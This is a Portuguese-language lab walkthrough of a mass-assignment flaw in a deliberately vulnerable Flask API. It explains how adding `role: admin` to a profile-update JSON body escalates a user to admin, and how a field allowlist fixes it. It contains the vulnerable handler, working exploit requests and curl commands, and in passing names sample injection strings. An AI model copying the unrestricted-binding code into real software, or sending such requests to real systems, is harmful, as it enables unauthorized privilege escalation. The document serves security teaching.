# Walkthrough — mass-assignment

A app tem um endpoint de atualização de perfil: você manda um corpo JSON com os campos da sua conta — `POST /profile` com `{"name": "...", "email": "..."}` — e ela salva. No sucesso, ela copia os campos que você mandou pra sua conta e devolve a conta atualizada. O problema: ela copia *quaisquer* chaves que o JSON carregar, não só `name` e `email`. Acrescente `"role": "admin"` — um campo que o formulário de perfil nunca ofereceu — e ele cai na sua conta também, te tornando um admin. A prova é server-side e está em duas respostas: o `GET /profile` passa a reportar `role: admin`, e o `GET /admin`, um `403` um momento atrás, passa a responder `200`. Tudo aqui é feito no Burp (ou `curl`); não há passo de browser, porque a escalada é decidida no servidor e visível no fio.

## 1. Contexto

A app `vulnerable` está em `127.0.0.1:8025` e a `fixed` em `127.0.0.1:8125`; não há banco nem segundo serviço — a conta vive num dict Python dentro do processo. Há uma conta demo, e ela *é* você, o usuário logado. Ela começa como `{"name": "Demo User", "email": "demo@example.com", "role": "user"}`. Três endpoints:

- `POST /profile` — atualiza a conta a partir de um corpo JSON. **É aqui que o bug mora.**
- `GET /profile` — devolve os campos da conta (`name`, `email`, `role`) — a sua prova.
- `GET /admin` — uma view só-de-admin: `200` se o `role` da conta é `admin`, `403` caso contrário — a escalada tornada concreta.

Isto é **mass assignment**: a app faz bind dos campos de uma request num objeto em bloco, sem decidir quais campos o usuário tem permissão de setar (também chamado de *object injection* ou *autobinding*). Termos usados abaixo:

- **allowlist de campos**: o conjunto explícito de campos que o servidor deixa o cliente setar — aqui, `name` e `email`.
- **campo privilegiado / sensível**: um campo que concede privilégio ou cruza uma fronteira de confiança se o usuário o setar — `role`, `is_admin`, `is_staff`, `verified`, `credits`. Só o servidor deveria setar esses.
- **privilege escalation**: ganhar um privilégio maior do que o que te foi atribuído. Aqui é *vertical* — um `user` normal virando `admin` — em oposição a *horizontal*, ler o dado de um usuário do mesmo nível.
- **ORM** (Object-Relational Mapping): uma lib que mapeia objetos pra linhas/colunas do banco — o cenário onde mass assignment é mais notório. Este átomo usa um dict cru (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md)).

Isto é **A01 — Broken Access Control**. (CWE — Common Weakness Enumeration — é o catálogo padrão de classes de fraqueza.) A entrada de mass assignment é o **CWE-915**, "Improperly Controlled Modification of Dynamically-Determined Object Attributes"; seu pai, o **CWE-913**, é um dos CWEs que a OWASP mapeia pra A01:2021. A exploração é feita inteiramente no Burp; `curl` é o equivalente — não há trilha browser (este átomo é API-only).

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). O handler vulnerable é curto:

```python
@app.route("/profile", methods=["POST"])
def update_profile():
    data = request.get_json(silent=True) or {}
    # VULNERABLE: copy EVERY field from the client's JSON straight into the account ...
    account.update(data)
    return jsonify(account)
```

`account.update(data)` mescla *toda* chave do JSON parseado no dict da conta. `data` é o que quer que o cliente tenha mandado — nada o restringe a `name` e `email`. Pergunta de auditoria: *esse update escolhe quais campos o cliente pode setar, ou aplica todos?* — aplica todos. O formulário só ofereceu `name` e `email`, então o dev assume que só esses chegam; mas nada no código impõe essa suposição. O fix (foreshadow): deixar o **servidor** nomear os campos que vai aceitar — uma allowlist — em vez de copiar o input inteiro.

Como os átomos irmãos de A01, este bug não faz `grep`: não há `eval`, `|safe`, ou `f"` pra procurar. Você o acha lendo cada handler que escreve num objeto e perguntando "quais campos o cliente consegue de fato setar aqui?"

## 3. Exploração via Burp Suite

Aponte o Burp pra API vulnerable em `127.0.0.1:8025` e trabalhe no Repeater. Todo request abaixo é um bloco que você cola no Repeater; os mesmos requests rodam no `curl`. Uma coisa pra guardar: os requests `POST /profile` precisam carregar `Content-Type: application/json` — é esse header que faz o Flask parsear o corpo como JSON. Sem ele, o corpo é ignorado e nada atualiza.

### Baseline — a feature funcionando

Leia a conta como ela começa:

```
GET /profile HTTP/1.1
Host: 127.0.0.1:8025
```

Resposta — `200`:

```json
{"email":"demo@example.com","name":"Demo User","role":"user"}
```

Você é um `user` normal. Confirme que a view de admin está fechada pra você:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8025
```

Resposta — `403 FORBIDDEN` (a página de forbidden padrão do Flask). Agora faça uma atualização de perfil **legítima** — mude seu nome e e-mail:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8025
Content-Type: application/json

{"name": "New Name", "email": "new@example.com"}
```

Resposta — `200`, a conta atualizada, `role` intocado:

```json
{"email":"new@example.com","name":"New Name","role":"user"}
```

O equivalente com curl:

```bash
curl -i http://127.0.0.1:8025/profile -H 'Content-Type: application/json' \
  -d '{"name": "New Name", "email": "new@example.com"}'
```

A feature faz o que promete: `name` e `email` mudam, `role` fica `user`. Daqui em diante, só uma coisa muda — o JSON ganha uma chave extra.

### Passo 1 — Adicionar o campo privilegiado (o ataque)

O formulário de perfil ofereceu `name` e `email`. Adicione uma terceira chave que ele nunca ofereceu — `role` — e a sete pra `admin`:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8025
Content-Type: application/json

{"name": "New Name", "email": "new@example.com", "role": "admin"}
```

Resposta — `200`, e olhe o último campo:

```json
{"email":"new@example.com","name":"New Name","role":"admin"}
```

`account.update(data)` copiou o `role` junto com `name` e `email`. curl:

```bash
curl -i http://127.0.0.1:8025/profile -H 'Content-Type: application/json' \
  -d '{"name": "New Name", "email": "new@example.com", "role": "admin"}'
```

### Passo 2 — Confirmar a escalada

Leia a conta de volta:

```
GET /profile HTTP/1.1
Host: 127.0.0.1:8025
```

Resposta — você agora é `role: admin`:

```json
{"email":"new@example.com","name":"New Name","role":"admin"}
```

E a view de admin, um `403` um minuto atrás:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8025
```

Resposta — `200`:

```json
{"message":"Admin area","note":"admin-only content"}
```

Isso é o mass assignment. Você não quebrou autenticação nem injetou sintaxe nenhuma — você adicionou uma chave bem-formada a um corpo JSON que a API aceitou de bom grado, e o servidor a escreveu na sua conta. (`role: admin` e o conteúdo demo de admin são valores benignos de lab; nada aqui é destrutivo, e é tudo em loopback.)

> A conta é em memória e agora fica `admin` até o container reiniciar, então rode o baseline **antes** do ataque — como acima — pra ver o `403` → `200` virar limpo. Pra resetar, `./atom down mass-assignment` e depois `./atom up mass-assignment`.

## 4. O que a vuln NÃO é

O exploit é só um campo extra num corpo JSON, então é fácil tirar a lição errada. Isole a causa real:

- **NÃO é IDOR / BOLA.** Você não leu nem tocou no objeto de *outro* usuário — você escreveu na **sua própria** conta. A escalada é **vertical** (um `user` virando `admin`), não horizontal (ler o dado de um vizinho do mesmo nível). Onde o `bola-rest` e os átomos de IDOR (`idor-numeric-id`, `idor-uuid-guessable`) têm um check de *dono* (ownership) ausente sobre o objeto de outro, aqui o que falta é a *seleção de campos* no seu próprio objeto.
- **NÃO é injection.** Você não injetou sintaxe — nada de `' OR 1=1`, `<script>`, `{{7*7}}`, `; id`. O corpo é JSON perfeitamente bem-formado; você só adicionou mais uma chave. O campo extra é **dado válido**, não código. Injection é "input vira código/estrutura"; isto é "input escreve num campo que não deveria".
- **NÃO é auth bypass.** Você não derrotou um login nem forjou uma sessão — a conta é legitimamente sua. O buraco é a **atribuição cega**: o servidor deixou você escrever `role`, um campo que só ele deveria controlar.

**Prova de isolamento:** mande a atualização *legítima* — `{"name": "New Name", "email": "new@example.com"}`, sem `role` — pras **duas** apps, e as duas voltam `{"email":"new@example.com","name":"New Name","role":"user"}`, byte a byte. A feature é idêntica. Só o campo extra `role` separa as duas: a app vulnerable o copia, a fixed o ignora.

A única coisa que a vuln **é**: o servidor confia na *forma* do input e deixa o cliente decidir quais atributos setar. O único fix é deixar o **servidor** decidir — uma allowlist de campos.

## 5. Impacto

**Privilege escalation vertical:** um `user` normal vira `admin`, e o `GET /admin` só-de-admin abre (`403` → `200`). Esse é o teto honesto deste átomo. **Não é RCE nem takeover de servidor** — você ganhou um papel na aplicação, não execução de código. A razão de mass assignment ser um risco nomeado no OWASP API Security Top 10 é quão barato e difundido ele é: qualquer endpoint que faça bind de um corpo de request num objeto sem selecionar campos deixa um cliente escrever atributos sensíveis — `role`, `is_admin`, `verified`, `credits`, ou o `owner` de um registro. Esse é o alcance da classe — descrito aqui, não construído.

## 6. Por que o fix funciona

Rode a cadeia contra a API fixed na porta **8125** (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança). Ela começa do zero — o `GET /profile` mostra `role: user`, o `GET /admin` → `403`. Agora mande o **mesmo payload do ataque**:

```
POST /profile HTTP/1.1
Host: 127.0.0.1:8125
Content-Type: application/json

{"name": "New Name", "email": "new@example.com", "role": "admin"}
```

Resposta — `200`, mas olhe o `role`:

```json
{"email":"new@example.com","name":"New Name","role":"user"}
```

`name` e `email` atualizaram; **o `role` foi ignorado**. O handler fixed copia só os campos da sua allowlist (`ALLOWED_FIELDS = {"name", "email"}`), então a chave extra `role` cai no chão. O `GET /profile` ainda mostra `role: user`, e o `GET /admin` ainda retorna `403`. Enquanto isso a atualização legítima de `name`/`email` se comporta exatamente como se comportou na app vulnerable — a feature está intacta; só o campo fora da lista é descartado.

O fix inteiro é o servidor decidir quais campos podem ser setados — uma **allowlist de campos**, não um blocklist que caça o `role`. É a mesma lição "o servidor decide, não o input" do `open-redirect`, onde o servidor decide o *destino* do redirect; aqui ele decide os *campos* graváveis. Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra por que um blocklist perde e por que uma allowlist é o fix durável.
